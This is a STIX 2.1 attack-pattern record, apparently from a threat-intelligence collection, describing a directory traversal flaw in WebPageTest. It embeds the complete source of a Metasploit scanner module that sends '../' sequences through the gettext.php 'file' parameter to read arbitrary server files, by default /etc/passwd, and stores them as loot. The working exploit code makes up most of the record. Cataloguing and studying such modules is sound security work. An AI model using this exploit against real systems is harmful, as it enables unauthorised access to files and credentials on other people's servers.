{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6d58f2b-b438-4855-9d25-10be29a00b48",
    "created": "2024-08-14T16:29:46.641617Z",
    "modified": "2024-08-14T16:29:46.641621Z",
    "name": "WebPageTest Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability found in WebPageTest. Due to the way the gettext.php script handles the 'file' parameter, it is possible to read a file outside the www directory.  'References'     => [ ['EDB', '19790'] ['OSVDB', '83817'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/webpagetest_traversal.rb",
            "external_id": "webpagetest_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebPageTest Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability found in WebPageTest.\n        Due to the way the gettext.php script handles the 'file' parameter, it is possible\n        to read a file outside the www directory.\n      },\n      'References'     =>\n        [\n          ['EDB', '19790'],\n          ['OSVDB', '83817']\n        ],\n      'Author'         =>\n        [\n          'dun',    # Discovery, PoC\n          'sinn3r'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-07-13'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to WebPageTest', '/www/']),\n        OptString.new('FILE', [ true,  \"The path to the file to view\", '/etc/passwd']),\n        OptInt.new('DEPTH', [true, 'The max traversal depth', 11])\n      ])\n  end\n\n\n  def run_host(ip)\n    file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : \"/#{datastore['FILE']}\"\n    traverse = \"../\" * datastore['DEPTH']\n    uri      = normalize_uri(target_uri.path)\n    base     = File.dirname(\"#{uri}/.\")\n\n    print_status(\"Requesting: #{file} - #{rhost}\")\n    res = send_request_cgi({\n      'uri'      => \"#{base}/gettext.php\",\n      'vars_get' => { 'file' => \"#{traverse}#{file}\" }\n    })\n\n    if not res\n      print_error(\"No response from server.\")\n      return\n    end\n\n\n    if res.code != 200\n      print_error(\"Server returned a non-200 response (body will not be saved):\")\n      print_line(res.to_s)\n      return\n    end\n\n    vprint_line(res.body)\n    p = store_loot('webpagetest.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))\n    print_good(\"File saved as: #{p}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-13"
}